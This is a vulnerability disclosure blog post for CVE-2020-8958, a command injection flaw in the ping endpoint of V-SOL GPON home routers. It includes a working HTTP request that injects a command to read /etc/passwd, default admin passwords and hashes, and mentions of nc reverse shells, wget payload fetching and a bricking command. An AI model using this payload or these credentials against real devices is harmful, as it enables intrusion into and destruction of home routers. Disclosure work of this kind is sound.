---
title: Command injection vulnerability in V-SOL home networking devices
date: 2020-07-15T13:36:55+05:30
author: Karan Saini
excerpt: This article details an arbitrary OS command injection vulnerability present in the management portal for several models of GPON home routers manufactured by Guangzhou V-SOLUTION.
layout: post
permalink: /os-command-injection-v-sol/
image: /media/v-sol.png
categories:
  - Security
tags:
  - CVE-2020-8958
  - GPON
---
# Command injection vulnerability in V-SOL home networking devices
This article details an arbitrary OS command injection vulnerability present in the management portal for several GPON home routers manufactured by Guangzhou V-SOLUTION (&#8220;V-SOL&#8221;). V-SOL manufactures a variety of FTTH and FTTB products, including residential gateway devices, network switches, line termination devices, and more.

This vulnerability was discovered and reported to the vendor in February of 2020, and to date, a patch has not been released. I decided that I would publish details about this specific vulnerability shortly after researchers Pierre Kim and Alexandre Torres published their own work documenting what they surmised to be <a aria-label="undefined (opens in a new tab)" href="https://pierrekim.github.io/blog/2020-07-07-cdata-olt-0day-vulnerabilities.html" target="_blank" rel="noreferrer noopener">potential backdoor accounts</a> present in optical line termination devices manufactured by vendor &#8216;C-Data&#8217; — as well as those <a aria-label="undefined (opens in a new tab)" href="https://pierrekim.github.io/blog/2020-07-14-v-sol-olt-0day-vulnerabilities.html" target="_blank" rel="noreferrer noopener">manufactured by V-SOL.</a>

## CVE-2020-8958

The vulnerable endpoint is part of the &#8216;PING diagnosis&#8217; functionality that is available on the device management portal, located at `<IP_ADDR>/boaform/admin/formPing`. Arbitrary command execution can be achieved by sending a crafted `HTTP` `POST` request containing shell meta-characters to the PING diagnosis endpoint.

~~~
POST http://<IP_ADDR>/boaform/admin/formPing HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: http://<IP_ADDR>
Connection: keep-alive
Referer: http://<IP_ADDR>/diag_ping_admin_en.asp
Upgrade-Insecure-Requests: 1
Host: <IP_ADDR>

target_addr=%3Bcat%20%2Fetc%2Fpasswd&waninf=LAN
~~~

![](/media/Screenshot_2020-07-13-1GEWifi.png){: width="250" style="display: block; margin-left: auto; margin-right: auto;" }

Administrator credentials are required in order to access the management portal and exploit this flaw. Default credentials for the device can be found in the table below.

<table>
  <tr>
    <td>
      <strong>Username</strong>
    </td>
    
    <td>
      <strong>Hash</strong>
    </td>
    
    <td>
      <strong>Password</strong>
    </td>
    
    <td>
      <strong>UID</strong>
    </td>
    
    <td>
      <strong>GID</strong>
    </td>
    
    <td>
      <strong>Shell</strong>
    </td>
  </tr>
  
  <tr>
    <td>
      admin
    </td>
    
    <td>
      $1$$CoERg7ynjYLsj2j4glJ34.
    </td>
    
    <td>
      admin
    </td>
    
    <td>
    </td>
    
    <td>
    </td>
    
    <td>
      /tmp:/bin/cli
    </td>
  </tr>
  
  <tr>
    <td>
      adsl
    </td>
    
    <td>
      $1$$m9g7v7tSyWPyjvelclu6D1
    </td>
    
    <td>
      realtek
    </td>
    
    <td>
    </td>
    
    <td>
    </td>
    
    <td>
      /tmp:/bin/cli
    </td>
  </tr>
  
  <tr>
    <td>
      e8c
    </td>
    
    <td>
      $1$$L7MaPr42HrZ25CRVY1/89/
    </td>
    
    <td>
    </td>
    
    <td>
    </td>
    
    <td>
    </td>
    
    <td>
      /tmp:/bin/cli
    </td>
  </tr>
  
  <tr>
    <td>
      user
    </td>
    
    <td>
      $1$$ex9cQFo.PV11eSLXJFZuj.
    </td>
    
    <td>
      user
    </td>
    
    <td>
      1
    </td>
    
    <td>
    </td>
    
    <td>
      /tmp:/bin/cli
    </td>
  </tr>
</table>


_Note:_ Some versions of the device may come with different default credentials for accessing the administrative account. NETLINK, an Indian distributor of V-SOL devices, supplies `stdONU101` <a aria-label="undefined (opens in a new tab)" href="http://web.archive.org/web/20200715130909/https://www.bsnlsupport.com/Configuration%20in%20ONT%20for%20BSNL%20Service.pdf" target="_blank" rel="noreferrer noopener">as the default password</a> for the administrative account. 

A proof of concept script is available on <a aria-label="undefined (opens in a new tab)" href="https://github.com/qurbat/gpon" target="_blank" rel="noreferrer noopener">this repository,</a> execution of which will return the contents of the `/etc/passwd` file on a given vulnerable device. The `help` command provides a list of built-in shell commands that are available on the system. 

~~~
. : &#91; &#91;&#91; alias bg break cd chdir continue echo eval exec exit
export false fg hash help jobs kill let local printf pwd read
readonly return set shift source test times trap true type ulimit
umask unalias unset wait
~~~

A list of binaries available on the device can be found below.

~~~
11N_UDPserver
ShowStatus
aipc_util
arp
ash
auth
awk
boa
brctl
busybox
cat
chat
chmod
cli
config_wlan
configd
cp
ctadmin
cupsd
cwmpClient
dbg_tool
df
dhclient
dhcpd
dhcrelayV6
diag
diff
dnsmasq
ebtables
echo
ecmh
egrep
eponoamd
ethctl
expr
flash_erase
flash_eraseall
ftp
ftpd
fuser
grep
halt
ifconfig
igmpproxy
inetd
init
insmod
ip
ip6tables
ipcs
iptables
iptables-batch
iwcontrol
iwpriv
jsct_getloid
kill
killall
klogd
led
ledtest
linuxrc
loadconfig
login
loopback
lp
lpadmin
lpstat
ls
lsmod
md5sum
mdev
mfcv6d
mib
midware_intf
mini_upnpd
minidlna
miniupnpd
mkdir
mknod
mount
mpctl
nc
ntfs-3g
nv
oamcli
omci_app
omcicli
parallel
pidof
ping
ping6
pondetect
poweroff
ps
qc
radvd
radvdump
reboot
rm
rmmod
route
routed
saveconfig
sed
sh
show
sleep
slogd
smbd
spppctl
spppd
startcupsd
startup
stty
systemd
tar
tc
tcp2dev
telnetd
tftp
tftpd
top
traceroute
udhcpc
udhcpd
udpechoserver
umount
updatedd
updateddctrl
upnpctrl
upnpmd_cp
usbmount
vconfig
vsEncrypt
vsntp
vswdg
wdg
wget
wget_manage
wscd
xmlconfig
~~~

_Note:_ It was found that executing the `flash_eraseall` command on a vulnerable device will — for most purposes — result in the device being stuck in a perpetually bricked state.

The device utilizes BusyBox and is somewhat limited in terms of supported functions. A list of available functions can be found below.

~~~
ash, awk, cat, chmod, cksum, cmp, cp, df, diff, echo, egrep, expr,
fuser, grep, halt, ifconfig, init, insmod, ipcs, kill, killall,
klogd, linuxrc, ls, lsmod, md5sum, mdev, mkdir, mknod, mount, nc,
pidof, ping, ping6, poweroff, ps, reboot, rm, rmmod, route, sed,
sh, sleep, stty, tar, top, traceroute, umount, vconfig
~~~

It is possible for a remote attacker to gain a reverse shell on the device using `nc`. It is also possible to `wget` files and write them to the `/var/config` directory on the device. This can be used by a remote attacker to download bash scripts or other files for carrying out post-exploitation activities on the system.

_Note:_ `wget` will fail to fetch files — or rather will return empty files — if the server from which a particular file is being retrieved makes use of HTTPS_._

## Survey of affected devices

A brief survey of vulnerable devices reveals only one hardware version in usage: Version 1.1. Software versions that are known to be vulnerable fall between the ranges of V1.9.1-181203 and V2.9.0-181024, though it is suspected that build versions prior to V1.9.1-181203 would be affected too.

_Note:_ No devices running build versions prior to V1.9.1-181203 were discovered during the course of this research.

In February, when the issue was first reported to the manufacturer, the Shodan search engine was indexing a total of 8,387 vulnerable devices. This figure, however, might not be fully representative of the actual number of vulnerable devices at any given point, considering that ****a) results indexed on Shodan only represent those devices that, at the time, had remote management enabled and b) some users might have changed the administrative credentials used to access the management portal.

![](/media/Screenshot_2020-07-13-title-1ge-Shodan-Search.png){: width="250" style="display: block; margin-left: auto; margin-right: auto;" }

At the time this post was published, the number of vulnerable devices that were indexed on Shodan had dramatically reduced to 1,900. The reason for this decrease is not immediately apparent. A small country-wise list can be found below.

<table>
  <tr>
    <td>
      <strong>Country</strong>
    </td>
    
    <td>
      <strong>Number of devices</strong>
    </td>
  </tr>
  
  <tr>
    <td>
      Cambodia
    </td>
    
    <td>
      579
    </td>
  </tr>
  
  <tr>
    <td>
      India
    </td>
    
    <td>
      571
    </td>
  </tr>
  
  <tr>
    <td>
      Brazil
    </td>
    
    <td>
      239
    </td>
  </tr>
  
  <tr>
    <td>
      Bulgaria
    </td>
    
    <td>
      159
    </td>
  </tr>
  
  <tr>
    <td>
      Philippines
    </td>
    
    <td>
      95
    </td>
  </tr>
</table>

### UPDATE — July 15, 2020 (6 PM IST)

After this vulnerability was publicly disclosed, it was discovered that a sizeable number of vulnerable devices were omitted from the list above, due to the manufacturer having had made cursory changes (such as to the `<title>` tag) on the landing page of the management portal on some devices. This initially hindered the process of device discovery through fingerprinting, and the updated tally of publicly accessible vulnerable devices now reflects upward of the 20,000 mark.

## Final notes

Though the device in question is originally manufactured by V-SOL, it is primarily sold around the world through a network of regional distributors. In some cases, distributors will also place their own branding on both the physical hardware and the management portal for the device.

While it was not feasible to compile a conclusive list of distributors, V-SOL <a href="http://web.archive.org/web/20200715094952/https://www.gpononu.com/web-cases/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">states that</a> they have shipped over 500,000 devices that are sold by distributors in Brazil, India, Ukraine, Poland, Thailand, and Bangladesh. On their website, V-SOL also states that they have produced over 2 million individual FTTx units for China Telecom and China __Unicom_._

In India, <a aria-label="undefined (opens in a new tab)" href="https://www.flipkart.com/netlink-gepon-onu-1ge-wifi-2801rw-300-mbps-router/p/itmfejvgnc3td9fa" target="_blank" rel="noreferrer noopener nofollow">NETLINK </a>(2801RW), <a aria-label="undefined (opens in a new tab)" href="https://www.amazon.in/Syrotech-Technologies-1POTS-Fiber-Router/dp/B07Z1LZ46L" target="_blank" rel="noreferrer noopener nofollow">SyroTech</a> (HG323RGW), <a aria-label="undefined (opens in a new tab)" href="https://www.digisol.com/products/ftth-solutions/gepon/digisol-gepon-onu-dg-gr1310-300mbps-wi-fi-router-with-1-pon-and-1-giga-port/" target="_blank" rel="noreferrer noopener nofollow">Digisol </a>(DG-GR1310), and <a aria-label="undefined (opens in a new tab)" href="https://www.flipkart.com/dbc-technology-technologies-dual-mode-ftth-gpon-epon-onu-1ge-300-mbps-router/p/itmfgszvj23quxx3" target="_blank" rel="noreferrer noopener nofollow">DBC Technologies</a> are just a few of the companies that are involved in the marketing and distribution of networking devices manufactured by V-SOL. As of now, the devices that are offered by NETLINK and Digisol are confirmed to be vulnerable.

In the recent past, several other GPON network devices have been found to be similarly vulnerable, too. For instance: In 2018, researchers disclosed details about a similar flaw <a aria-label="undefined (opens in a new tab)" href="https://nvd.nist.gov/vuln/detail/CVE-2018-10561" target="_blank" rel="noreferrer noopener">(CVE-2018<strong>&#8211;</strong>10561)</a> affecting devices manufactured by California-based DASAN Zhone Solutions. The ecosystem of such devices has only become even more at risk since then, especially in light of the aforementioned research published by Kim et. al.

### Vulnerability information

<table>
  <tr>
    <td>
      <strong>Vendor</strong>
    </td>
    
    <td>
      <strong>Description</strong>
    </td>
    
    <td>
      <strong>Vulnerability</strong> <strong>Class</strong>
    </td>
    
    <td>
      <strong>Impact</strong>
    </td>
    
    <td>
      <strong>Remotely </strong> <strong>exploitable</strong>
    </td>
    
    <td>
    </td>
    
    <td>
    </td>
  </tr>
  
  <tr>
    <td>
      Guangzhou V-SOLUTION
    </td>
    
    <td>
      Guangzhou 1GE ONU devices V2801RW and V2804RGW running build version 1.9.1-181203 through 2.9.0-181024 allow remote attackers to execute arbitrary OS commands via shell metacharacters in theboaform/admin/formPing Dest IP Address field.<br />[CVE-2020-8958]
    </td>
    
    <td>
      Improper Neutralization of Special Elements used in an OS Command (&#8216;OS Command Injection&#8217;) [CWE-78]
    </td>
    
    <td>
      Arbitrary OS command execution
    </td>
    
    <td>
      YES
    </td>
    
    <td>
    </td>
    
    <td>
    </td>
  </tr>
</table>

## Disclosure timeline

  * Feb 11, 2020 &#8211; Vendor informed of vulnerability via email;
  * Feb 13, 2020 &#8211; <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-8958" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">CVE-2020-8958</a> assigned;
  * July 15, 2020 &#8211; Vulnerability publicly disclosed.
